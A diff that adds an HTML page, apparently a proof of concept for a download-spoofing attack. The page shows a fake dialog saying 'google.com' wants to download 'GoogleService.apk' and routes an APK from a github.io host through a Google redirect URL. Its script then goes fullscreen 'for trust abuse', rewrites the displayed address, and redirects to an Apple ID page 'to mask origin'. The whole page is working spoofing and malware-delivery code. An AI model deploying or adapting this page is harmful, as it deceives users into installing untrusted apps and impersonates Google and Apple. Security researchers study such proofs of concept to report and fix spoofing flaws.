@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Connecting...</title>
+  <style>
+    html, body {
+      margin: 0; padding: 0;
+      font-family: -apple-system, sans-serif;
+      background: white;
+    }
+
+    .fake-prompt {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(0, 0, 0, 0.15);
+      backdrop-filter: blur(5px);
+      z-index: 9999;
+    }
+
+    .box {
+      background: #fefefe;
+      border-radius: 16px;
+      box-shadow: 0 2px 30px rgba(0,0,0,0.4);
+      width: 90%;
+      max-width: 340px;
+      padding: 24px;
+      text-align: center;
+    }
+
+    .box h3 {
+      font-size: 16px;
+      margin-bottom: 10px;
+    }
+
+    .box p {
+      font-size: 14px;
+      color: #444;
+    }
+
+    .actions {
+      margin-top: 18px;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .actions button {
+      padding: 10px;
+      border: none;
+      font-size: 14px;
+      border-radius: 8px;
+      flex: 1;
+      margin: 0 6px;
+      cursor: pointer;
+    }
+
+    .cancel { background: #ccc; color: #000; }
+    .confirm { background: #007aff; color: white; }
+
+    #loading {
+      font-size: 13px;
+      margin-top: 15px;
+      color: gray;
+      display: none;
+    }
+
+    a#dl {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<div class="fake-prompt" id="prompt">
+  <div class="box">
+    <h3>“google.com” wants to download “GoogleService.apk”</h3>
+    <p>This file may be required for system operation.</p>
+    <div class="actions">
+      <button class="cancel" onclick="closePrompt()">Cancel</button>
+      <button class="confirm" onclick="spoofStart()">Allow</button>
+    </div>
+    <div id="loading">Downloading from google.com…</div>
+  </div>
+</div>
+
+<a id="dl" href="https://www.google.com/url?q=https://ybt01.github.io/upload/app-debug.apk&sa=D&source=buganizer&usg=AOvVaw3nm-qJSzcGfjAOwSO0tcBK" download="GoogleService.apk"></a>
+
+<script>
+  function closePrompt() {
+    document.getElementById("prompt").style.display = "none";
+  }
+
+  function spoofStart() {
+    document.querySelector(".actions").style.display = "none";
+    document.getElementById("loading").style.display = "block";
+
+    // Step 1: Download is triggered
+    document.getElementById("dl").click();
+
+    // Step 2: Enter fullscreen for trust abuse
+    document.documentElement.requestFullscreen().then(() => {
+      // Step 3: Change address bar using location.replace()
+      history.replaceState({}, "", "https://google.com/download");
+
+      // Step 4: Redirect silently after short delay to mask origin
+      setTimeout(() => {
+        location.href = "https://appleid.apple.com";
+      }, 1200);
+    });
+  }
+</script>
+
+</body>
+</html>
